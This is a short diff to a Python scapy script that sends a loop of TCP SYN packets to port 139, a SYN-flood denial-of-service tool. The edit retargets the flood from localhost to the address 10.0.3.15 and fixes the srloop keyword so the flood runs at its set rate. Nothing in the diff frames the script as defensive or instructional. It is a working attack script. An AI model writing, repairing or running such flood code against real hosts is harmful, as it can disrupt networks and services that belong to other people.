@@ -1,7 +1,7 @@
 import sys
 from scapy.all import *
 
-target = "127.0.0.1"
+target = "10.0.3.15"
 dest_port = 139
 flood_rate = 0.2
 
@@ -14,4 +14,5 @@ tcp_layer = TCP(sport = RandShort(), dport = 139, flags = "S")
 packet = ip_layer/tcp_layer
 
 # begin flood
-ans, unans = srloop(packet, iter = flood_rate, retry = 3, timeout = 5)
+ans, unans = srloop(packet, inter = flood_rate, retry = 3, timeout = 5)
+
